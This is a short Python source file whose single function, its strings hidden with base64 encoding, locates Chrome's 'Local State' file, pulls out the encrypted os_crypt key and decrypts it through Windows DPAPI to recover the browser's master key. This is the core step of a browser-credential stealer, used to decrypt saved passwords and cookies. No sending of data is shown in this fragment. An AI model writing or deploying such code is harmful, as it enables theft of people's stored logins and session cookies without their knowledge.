import bd
import os
import json
import win32crypt as w


def gek():
    lsp = os.path.join(os.environ[bd.bd("VVNFUlBST0ZJTEU=")], bd.bd("QXBwRGF0YQ=="), bd.bd("TG9jYWw="),
                       bd.bd("R29vZ2xl"),
                       bd.bd("Q2hyb21l"), bd.bd("VXNlciBEYXRh"), bd.bd("TG9jYWwgU3RhdGU="))
    with open(lsp, "r", encoding="utf-8") as f:
        ls = f.read()
        ls = json.loads(ls)
    k = bd.bdd(ls[bd.bd("b3NfY3J5cHQ=")][bd.bd("ZW5jcnlwdGVkX2tleQ==")])
    k = k[5:]
    return w.CryptUnprotectData(k, None, None, None, 0)[1]
